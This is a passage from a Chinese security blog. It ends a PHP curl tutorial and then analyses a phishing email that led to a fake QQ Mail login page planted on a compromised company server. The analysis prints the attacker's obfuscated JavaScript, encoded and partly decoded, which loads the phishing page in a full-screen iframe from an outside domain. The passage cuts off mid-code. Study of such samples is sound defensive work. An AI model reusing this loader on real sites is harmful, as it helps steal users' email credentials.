class="line">//print_r($data);</span><br><span class="line">var_dump($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到，设置CURLOPT_RETURNTRANSFER为0，使用php请求百度页面，结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$curl = curl_init();</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, &apos;http://www.baidu.com&apos;);</span><br><span class="line">//设置头文件的信息作为数据流输出</span><br><span class="line">//curl_setopt($curl, CURLOPT_HEADER, 1);</span><br><span class="line">//设置获取的信息以文件流的形式返回，而不是直接输出。</span><br><span class="line">curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">//执行命令</span><br><span class="line">$data = curl_exec($curl);</span><br><span class="line">//关闭URL请求</span><br><span class="line">curl_close($curl);</span><br><span class="line">//显示获得的数据</span><br><span class="line">//print_r($data);</span><br><span class="line">var_dump($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>如果设置CURLOPT_RETURNTRANSFER为1,则不会将获取的页面直接输出在页面内，结果如下：</p>
<h2 id="0x03-post请求"><a href="#0x03-post请求" class="headerlink" title="0x03 post请求"></a>0x03 post请求</h2><p>post请求也是http请求中很重要的一种，既然是post请求，肯定要额外设置要post的数据才行，curl中需要配置CURLOPT_POST为1代表本次请求是post类型，然后再将要请求的数据通过CURLOPT_POSTFIELDS配置进本次请求，然后执行就可以提交post请求。</p>
<p>这里我们用上一篇有关iframe框架钓鱼的留言界面进行测试，我们将留言的昵称和内容设置好，通过php curl方法请求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$curl = curl_init();</span><br><span class="line">curl_setopt($curl,CURLOPT_URL,&quot;http://127.0.0.1/curl/xss.php&quot;);</span><br><span class="line">//设置获取的信息以文件流的形式返回，而不是直接输出。</span><br><span class="line">curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">//设置请求模式为post型</span><br><span class="line">curl_setopt($curl, CURLOPT_POST, 1);</span><br><span class="line">//配置post的数据</span><br><span class="line">$post_data = array(</span><br><span class="line">	&quot;name&quot; =&gt; &quot;curl_test&quot;,</span><br><span class="line">	&quot;message&quot; =&gt; &quot;heyheyhey&quot;</span><br><span class="line">);</span><br><span class="line">//全部数据使用HTTP协议中的&quot;POST&quot;操作来发送。</span><br><span class="line">curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);</span><br><span class="line">//执行请求</span><br><span class="line">$data = curl_exec($curl);</span><br><span class="line">//关闭请求</span><br><span class="line">curl_close($curl);</span><br><span class="line">//显示数据</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>根据返回的页面，发现这条留言已经被写入。</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>在需要使用php获取页面内容时，其实可以通过更加简单的file_get_contents()函数，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=file_get_contents(&quot;http://www.baidu.com&quot;);</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>但是学习curl是非常有必要的，curl虽然配置的参数更繁杂，但是相对应的支持的操作也就更多，比如cookies、验证、表单提交、文件上传等等，需要更加细致的操作时，就应该选用curl。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/21/分析并复现一次iframe框架钓鱼行为/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/21/分析并复现一次iframe框架钓鱼行为/" itemprop="url">
                  分析并复现一次iframe框架钓鱼行为
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-21T20:55:29+08:00">
                2018-05-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/21/分析并复现一次iframe框架钓鱼行为/" class="leancloud_visitors" data-flag-title="分析并复现一次iframe框架钓鱼行为">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>事情的起因是这样的，这几天正在玩手机的时候忽然收到一封邮件名是校园通知发件人是西安电子科技大学的邮件，然后顺手打开邮箱一看， <a href="http://mrw.so/" target="_blank" rel="noopener">http://mrw.so/</a> 的短链接，邮箱是一串随便注册的前缀，是钓鱼邮件没错了。看到同时抄送了那么多人，应该是在哪里注册后公开的邮箱和学校信息被人爬去批量发邮件钓鱼了。不过既然碰到了钓鱼，点开分析一下肯定是要做的。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing01.png" alt=""></p>
<h2 id="0x01-尝试"><a href="#0x01-尝试" class="headerlink" title="0x01 尝试"></a>0x01 尝试</h2><p>点击短链接跳转到了 <a href="http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb" target="_blank" rel="noopener">http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb</a><br> 并且在加载出来之前一直显示一个很刻意的“链接中”，并且url有好长的路径，看样子像是哪个公司的服务器被钓鱼作者放了点东西，直接访问了下 <a href="http://www.topaone.com" target="_blank" rel="noopener">http://www.topaone.com</a> 发现果然是一个叫京品设计的公司。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing02.png" alt=""></p>
<p>加载出来之后是一个qq邮箱的登陆解面，不过做的很不走心，网页title都没写qq邮箱，title旁边的ico也是qq空间而不是qq邮箱的ico，登陆框除了账号密码两个输入框和登陆按钮以外都是不可点击状态。随便填一个账号密码弹窗提示密码错误，而且返回信息的网址应该是钓鱼作者的服务器。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing03.png" alt=""></p>
<p>还有一点是在进入这个链接的时候，即使已经到了邮箱登陆页面，浏览器仍然一直处于加载状态，以之前自己写钓鱼网站的经验来猜测，对方应该使用了window.onload配合document.write来覆盖整个页面，所以每次加载完都会重触发一次window.onload，无限循环。</p>
<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>见识了一下大致的访问过程，该抓包看看具体是怎么个流程了，在burpsuite中截取数据包，发现访问到的页面返回了一堆编码过的js代码。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing04.png" alt=""></p>
<p>初步判断这个钓鱼作者在京品设计公司的服务器上面挂了一个存储型xss。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">&lt;!--</span></span><br><span class="line"><span class="undefined">document.write(unescape("%3Cscript%3E%0D%0A%3C%21--%0D%0Adocument.write%28unescape%28%22%253C%2521--%2523Include%2520File%253D%2522SqlIn.Asp%2522--%253E%250D%250A%253Chtml%253E%250D%250A%253Chead%253E%250D%250A%253Cmeta%2520http-equiv%253D%2522Content-Language%2522%2520content%253D%2522zh-cn%2522%253E%250D%250A%253Cmeta%2520HTTP-EQUIV%253D%2522Content-Type%2522%2520CONTENT%253D%2522text/html%253B%2520charset%253Dgb2312%2522%253E%250D%250A%253Ctitle%253Eukkifddssfggg---kuasa......%253C/title%253E%250D%250A%253Cmeta%2520name%253D%2522description%2522%2520content%253D%2522%2522%253E%250D%250A%253Clink%2520href%253D%2522index_files/88.css%253Fmax_age%253D31536000%2526d%253D1333188324128%2522%2520rel%253D%2522stylesheet%2522%2520type%253D%2522text/css%2522%253E%253Clink%2520href%253D%2522index_files/home_fixed.css%253Fmax_age%253D31536000%2526d%253D1334659684120%2522%2520rel%253D%2522stylesheet%2522%2520type%253D%2522text/css%2522%253E%250D%250A%250D%250A%253C%2521--%255Bif%2520%2521%2528IE%2529%255D%253E%253C%2521--%253E%253C%2521--%253Cbase%2520href%253D%2522%2522%253E--%253E%253Cbase%2520href%253D%2522.%2522%253E%253C%2521--%253C%2521%255Bendif%255D--%253E%250D%250A%253C%2521--%255Bif%2520%2521%2528IE%2529%255D%253E%253C%2521--%253E%253C%2521--%253Cbase%2520href%253D%2522%2522%253E--%253E%253Cbase%2520href%253D%2522.%2522%253E%253C%2521--%253C%2521%255Bendif%255D--%253E%250D%250A%250D%250A%253Cstyle%2520id%253D%2522mainJSBg%2522%2520type%253D%2522text/css%2522%253E%250D%250A.lay_background%257Bbackground-repeat%253Ano-repeat%253Bbackground-position%253Acenter%2520top%253Bbackground-attachment%253Ascroll%253Bbackground-image%253Aurl%252864538_top.jpg%2529%253B%257D%250D%250Abody%257Bbackground-image%253Aurl%252864538_bg.jpg%2529%253B%2520background-repeat%253Arepeat%253B%257D%253C/style%253E%250D%250A%250D%250A%250D%250A%253Cstyle%2520type%253D%2522text/css%2522%2520id%253D%2522dynamicStyle%2522%253E%250D%250A.ownermode%257Bdisplay%253Anone%253B%257D%250D%250A.clientmode%257Bdisplay%253A%253B%257D%250D%250A.editmode%257Bdisplay%253Anone%253B%257D%250D%250A.customoff%257Bdisplay%253A%253B%257D%250D%250A.alphamode%257Bdisplay%253Anone%253B%257D%250D%250A%253C/style%253E%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%253C/style%253E%250D%250A%253Clink%2520rel%253D%2522Shortcut%2520Icon%2522%2520href%253D%2522http%253A//ctc.qzonestyle.gtimg.cn/qzonestyle/qzone_client_v5/img/favicon.ico%2522%2520type%253D%2522image/x-icon%2522%253E%250D%250A%253C/head%253E%250D%250A%253Cbody%2520id%253D%2522QZ_Body%2522%2520class%253D%2522bg_body%2520%2520%2522%253E%250D%250A%250D%250A%253Cdiv%2520id%253D%2522welcomeflash%2522%2520style%253D%2522position%253Afixed%253B_position%253Aabsolute%253Btop%253A0%253Bleft%253A0%253Bbackground-color%253Awhite%253Btext-align%253Acenter%253Bwidth%253A100%2525%253Bz-index%253A30000%253Bheight%253A10000px%253B%2522%2520onClick%253D%2522wSwf_obj_swf.call%2528this%2529%2522%253E%253Cdiv%2520style%253D%2522width%253A100%2525%253Bposition%253Aabsolute%253Bleft%253A0%253Btop%253A0%253Bbackground%253Awhite%253Bheight%253A100%2525%253B%2522%253E%250D%250A%250D%250A%253C%25u94FE%25u63A5%25u4E2D%25B7%25B7%25B7%25B7%25B7%253E%250D%250A%250D%250A%253C/div%253E%253Cdiv%2520style%253D%2522width%253A100%2525%253Bcursor%253Apointer%253Bposition%253Aabsolute%253Bleft%253A0px%253Bbackground%253Aurl%2528about%253Ablank%2529%253Bopacity%253A0%253Bz-index%253A30001%253Btop%253A0px%253Bheight%253A100%2525%2522%253E%253C/div%253E%253C/div%253E%250D%250A%253Cscript%2520type%253D%2522text/javascript%2522%253E%250D%250A%2528function%2528%2529%2520%257B%250D%250A%2509var%2520wel%253Ddocument.getElementById%2528%2527welcomeflash%2527%2529%252Ctimer%252Cch%252C_s%253Dnew%2520Function%253B%250D%250A%2509window.wSwf_obj_swf%2520%253D%2520window.wSwf_obj_swf_s%253Dfunction%2528%2529%2520%257B%250D%250A%2509%2509document.documentElement.style.overflow%2520%253D%2520%2522%2522%253B%250D%250A%2509%2509wel%2520%2526%2526%2520%2528wel.innerHTML%2520%253D%2520%2527%2527%2529%253B%250D%250A%2509%2509wel%2520%2526%2526%2520document.body.removeChild%2528wel%2529%253B%250D%250A%2509%2509window.removeEventListener%253Fwindow.removeEventListener%2528%2527resize%2527%252C_s%2529%253A%2528window.detachEvent%2526%2526window.detachEvent%2528%2527onresize%2527%252C_s%2529%2529%253B%250D%250A%2509%2509clearTimeout%2528timer%2529%253B%250D%250A%2509%257D%253B%250D%250A%2509timer%2520%253D%2520setTimeout%2528wSwf_obj_swf%252C%25204000%2529%253B%250D%250A%2509if%2520%2528wel%2529%2520%257B%250D%250A%2509%2509_s%253Dfunction%2528%2529%257B%250D%250A%2509%2509%2509ch%253Ddocument.documentElement.clientHeight%253B%250D%250A%2509%2509%2509wel.children%255B0%255D.style.paddingTop%2520%253D%2520Math.floor%2528Math.max%25280%252Cch%2520-%2520590%2529%2520/%25202%2529+%2527px%2527%253B%250D%250A%2509%2509%257D%253B%250D%250A%250D%250A%2509%2509document.documentElement.style.overflow%2520%253D%2520%2522hidden%2522%253B%250D%250A%2509%2509_s%2528%2529%253B%250D%250A%2509%2509window.addEventListener%253Fwindow.addEventListener%2528%2527resize%2527%252C_s%252Cfalse%2529%253A%2528window.attachEvent%2526%2526window.attachEvent%2528%2527onresize%2527%252C_s%2529%2529%253B%250D%250A%2509%257D%250D%250A%257D%2529%2528%2529%253B%250D%250A%253C/script%253E%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%253Cstyle%253Ehtml%257Boverflow%253Ahidden%253B%257Dbody%257Bheight%253A100%2525%253Bmargin%253A0px%253B%257D%253C/style%253E%253C/head%253E%253Cbody%2520scroll%253D%2522no%2522%253E%250D%250A%253Ciframe%2520id%253D%2522iframe%2522%2520%2520%2520height%253D%2522100%2525%2522%2520width%253D%2522100%2525%2522%2520%2520frameborder%253D%25220%2522%253E%253C/iframe%253E%250D%250A%2520%2520%253Cscript%2520%2520%2520language%253D%2522javascript%2522%253E%2520%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520var%2520pos%252Cstr%252Cpara%252Curl%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520str%2520%253D%2520window.location.href%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520pos%2520%253D%2520str.indexOf%2528%2522%253F%2522%2529%2520%2520%253B%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520url%2520%253D%2520str.substring%2528pos+1%2529%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520%2528pos%253E0%2529%257B%2520%2520%250D%250A%2509%2509%2509%2509n%253D%2527http%253A//ujhgdgjalkfja2.tk/%2527%253B%250D%250A%2509%2509%2509%2509j1%253Dn+url%253B%250D%250A%2509%2509%2509%2509c%253D%2527%253Clink%2520rel%253D%2522shortcut%2520icon%2522%2520href%253D%2522https%253A//s.tbcdn.cn/apps/login/static/img/favicon.ico%2522%2520type%253D%2522image/x-icon%2522%2520/%253E%2527%253B%250D%250A%2509%2509%2509%2509b%253D%2527%253Chtml%253E%253Chead%253E%253Cstyle%253Ehtml%257Boverflow%253Ahidden%253B%257Dbody%257Bheight%253A100%2525%253Bmargin%253A0px%253B%257D%253C/style%253E%253C/head%253E%253Cbody%2520scroll%253D%2522no%2522%253E%2527%253B%250D%250A%2509%2509%2509%2509a%253D%2527%253Ciframe%2520name%253D%2522main%2522%2520%2520height%253D%2522100%2525%2522%2520src%253D%2522%2527%253B%250D%250A%2509%2509%2509%2509k1%253D%2527%2522%2520width%253D%2522101%2525%2522%2520%2520frameborder%253D%25220%2522%253E%253C/iframe%253E%2527%253B%250D%250A%2520%2509%2509%2509%2509var%2520%2520d%2520%253D%2520%2520window.frames%255B0%255D%253B%250D%250A%2520%2520%2509%2509%2509%2509d.document.write%2528c+b+a+j1+k1%2529%253B%2520%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520else%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520%2520%250D%250A%2520%2520%253C/script%253E%250D%250A%2520%2520%250D%250A%250D%250A%253Chead%253E%22%29%29%3B%0D%0A//--%3E%0D%0A%3C/script%3E"));</span></span><br><span class="line"><span class="undefined">//--&gt;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个钓鱼网站作者没有对代码做什么加密，明显只是多次编码过的js代码，直接url解码两次，得到清晰的js代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">&lt;!--</span></span><br><span class="line"><span class="xml">document.write(unescape("<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">&lt;!--</span></span><br><span class="line"><span class="xml">document.write(unescape("<span class="comment">&lt;!--#Include File="SqlIn.Asp"--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Language"</span> <span class="attr">content</span>=<span class="string">"zh-cn"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"Content-Type"</span> <span class="attr">CONTENT</span>=<span class="string">"text/html; charset=gb2312"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>ukkifddssfggg---kuasa......<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"index_files/88.css?max_age=31536000&amp;d=1333188324128"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"index_files/home_fixed.css?max_age=31536000&amp;d=1334659684120"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--[if !(IE)]&gt;&lt;!--&gt;</span><span class="comment">&lt;!--&lt;base href=""&gt;--&gt;</span><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"."</span>&gt;</span><span class="comment">&lt;!--&lt;![endif]--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--[if !(IE)]&gt;&lt;!--&gt;</span><span class="comment">&lt;!--&lt;base href=""&gt;--&gt;</span><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"."</span>&gt;</span><span class="comment">&lt;!--&lt;![endif]--&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">"mainJSBg"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">.lay_background&#123;background-repeat:no-repeat;background-position:center top;background-attachment:scroll;background-image:url(64538_top.jpg);&#125;</span></span><br><span class="line"><span class="xml">body&#123;background-image:url(64538_bg.jpg); background-repeat:repeat;&#125;<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">id</span>=<span class="string">"dynamicStyle"</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">.ownermode&#123;display:none;&#125;</span></span><br><span class="line"><span class="undefined">.clientmode&#123;display:;&#125;</span></span><br><span class="line"><span class="undefined">.editmode&#123;display:none;&#125;</span></span><br><span class="line"><span class="undefined">.customoff&#123;display:;&#125;</span></span><br><span class="line"><span class="undefined">.alphamode&#123;display:none;&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"Shortcut Icon"</span> <span class="attr">href</span>=<span class="string">"http://ctc.qzonestyle.gtimg.cn/qzonestyle/qzone_client_v5/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">"QZ_Body"</span> <span class="attr">class</span>=<span class="string">"bg_body  "</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"welcomeflash"</span> <span class="attr">style</span>=<span class="string">"position:fixed;_position:absolute;top:0;left:0;background-color:white;text-align:center;width:100%;z-index:30000;height:10000px;"</span> <span class="attr">onClick</span>=<span class="string">"wSwf_obj_swf.call(this)"</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:100%;position:absolute;left:0;top:0;background:white;height:100%;"</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">链接中?????</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:100%;cursor:pointer;position:absolute;left:0px;background:url(about:blank);opacity:0;z-index:30001;top:0px;height:100%"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">(function() &#123;</span></span><br><span class="line"><span class="undefined">	var wel=document.getElementById('welcomeflash'),timer,ch,_s=new Function;</span></span><br><span class="line"><span class="undefined">	window.wSwf_obj_swf = window.wSwf_obj_swf_s=function() &#123;</span></span><br><span class="line"><span class="undefined">		document.documentElement.style.overflow = "";</span></span><br><span class="line"><span class="undefined">		wel &amp;&amp; (wel.innerHTML = '');</span></span><br><span class="line"><span class="undefined">		wel &amp;&amp; document.body.removeChild(wel);</span></span><br><span class="line"><span class="undefined">		window.removeEventListener?window.removeEventListener('resize',_s):(window.detachEvent&amp;&amp;window.detachEvent('onresize',_s));</span></span><br><span class="line"><span class="undefined">		clearTimeout(timer);</span></span><br><span class="line"><span class="undefined">	&#125;;</span></span><br><span class="line"><span class="undefined">	timer = setTimeout(wSwf_obj_swf, 4000);</span></span><br><span class="line"><span class="undefined">	if (wel) &#123;</span></span><br><span class="line"><span class="undefined">		_s=function()&#123;</span></span><br><span class="line"><span class="undefined">			ch=document.documentElement.clientHeight;</span></span><br><span class="line"><span class="undefined">			wel.children[0].style.paddingTop = Math.floor(Math.max(0,ch - 590) / 2) 'px';</span></span><br><span class="line"><span class="undefined">		&#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">		document.documentElement.style.overflow = "hidden";</span></span><br><span class="line"><span class="undefined">		_s();</span></span><br><span class="line"><span class="undefined">		window.addEventListener?window.addEventListener('resize',_s,false):(window.attachEvent&amp;&amp;window.attachEvent('onresize',_s));</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined">&#125;)();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span>   <span class="attr">height</span>=<span 